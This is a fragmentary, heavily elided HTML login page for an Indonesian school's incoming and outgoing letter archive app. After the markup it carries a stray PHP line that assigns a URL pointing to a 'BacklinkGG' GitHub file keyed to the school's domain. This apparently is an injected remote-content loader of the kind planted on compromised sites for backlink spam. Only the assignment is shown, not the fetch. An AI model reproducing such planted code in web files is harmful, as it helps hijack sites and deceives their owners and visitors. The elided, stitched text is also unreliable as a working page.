...
<html lang="en">
    <head>
        ...
        <title>Aplikasi Manajemen Pengelolaan Arsip Surat Masuk Keluar</title>
        ...
        <div class="container py-5">
            ...
            <div class="row justify-content-center">
                <div class="col-xl-5 col-lg-5 col-md-9">
                    ...
                    <h3 class="text-white text-center font-weight-bold">Aplikasi Manajemen Pengelolaan Arsip Surat Masuk Keluar</h3>
                                ...
                                <div class="col-lg-12">
                                    <div class="p-5">
                                        ...
                                        <form class="user" action="" method="post">
                                            ...
                                            <button type="submit" class="btn btn-success btn-user btn-block" name="login"><i class="fas fa-fw fa-sign-in-alt mr-1"></i> Masuk</button>
                                        </form>
                                    </div>
                                </div>
                            </div>
...
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/mtsdarululumsasa/arsipku.mtsdarululumsasa.sch.id/system.txt';
